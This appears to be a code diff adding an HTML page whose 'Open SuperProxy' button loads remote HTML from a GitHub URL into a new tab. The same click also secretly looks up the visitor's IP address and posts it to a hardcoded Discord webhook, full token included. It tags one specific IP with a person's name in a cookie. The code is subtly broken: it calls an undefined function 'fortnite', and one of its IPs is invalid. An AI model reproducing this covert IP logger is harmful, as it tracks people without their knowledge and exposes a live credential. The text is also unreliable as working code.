@@ -1,0 +1,69 @@
+<script>
+function openWebsite() {
+  var rawURL = "https://raw.githubusercontent.com/endr1337/superproxy23/main/SuperProxy_0.5.html";
+  var xhr = new XMLHttpRequest();
+  xhr.open("GET", rawURL, true);
+  xhr.onreadystatechange = function() {
+    if (xhr.readyState === 4 && xhr.status === 200) {
+      var htmlCode = xhr.responseText;
+      var newTab = window.open("", "_blank");
+      newTab.document.open();
+      newTab.document.write(htmlCode);
+      newTab.document.close();
+    }
+  };
+  xhr.send();
+}
+
+function setCookie(name, value, days) {
+  var expires = "";
+  if (days) {
+    var date = new Date();
+    date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
+    expires = "; expires=" + date.toUTCString();
+  }
+  document.cookie = name + "=" + (value || "") + expires + "; path=/";
+}
+
+function getIPAddress(callback) {
+  var xhr = new XMLHttpRequest();
+  xhr.onreadystatechange = function () {
+    if (xhr.readyState === 4 && xhr.status === 200) {
+      var response = JSON.parse(xhr.responseText);
+      var ipAddress = response.ip;
+      callback(ipAddress);
+    }
+  };
+  xhr.open("GET", "https://api.ipify.org?format=json", true);
+  xhr.send();
+}
+
+function messageSend() {
+  fortnite(function (ipAddress) {
+    var cookieValue = "";
+    if (ipAddress === "108.235.203.32") {
+      cookieValue = "Name: Jackson On Main PC";
+    } else if (ipAddress === "987.654.321.0") {
+      cookieValue = "Value for IP 987.654.321.0";
+    } else {
+      cookieValue = "Default Value";
+    }
+
+    setCookie("myCookie", cookieValue, 30);
+
+    const request = new XMLHttpRequest();
+    request.open("POST", "https://discord.com/api/webhooks/1163350348254158878/vs93mWsYLjte4FLddxbHtuPEMrDG8SRSr6sUkgglv6Jv4ASdcuK5nBY-uq-hDM0SYMlo");
+
+    request.setRequestHeader('Content-type', 'application/json');
+
+    const params = {
+      username: "IP Checker",
+      avatar_url: "https://c8.alamy.com/comp/JMGG51/cellphone-is-beeing-infected-of-cumputer-with-virus-mobile-concept-JMGG51.jpg",
+      content: "IP Address: " + ipAddress + "\nCookie Value: " + cookieValue
+    }
+
+    request.send(JSON.stringify(params));
+  });
+}
+</script>
+<button onclick="openWebsite(); messageSend()" style="background-color: purple; color: white; font-family: Arial, sans-serif; font-size: 24px; width: 100%; height: 100%; border: none; cursor: pointer;">Open SuperProxy</button>
